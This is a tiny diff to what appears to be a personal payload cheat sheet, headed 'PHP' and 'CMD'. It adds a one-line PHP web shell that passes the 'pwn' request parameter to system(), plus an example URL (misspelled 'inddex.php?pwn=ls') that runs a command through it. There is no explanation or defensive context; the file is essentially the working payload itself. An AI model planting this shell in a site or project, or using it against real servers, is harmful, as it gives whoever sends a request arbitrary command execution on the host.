@@ -1,5 +1,8 @@
 # PHP
 
-system($_REQUEST['pwn']);
+# CMD
+<?php system($_REQUEST['pwn']); ?>
 
 inddex.php?pwn=ls
+
+#
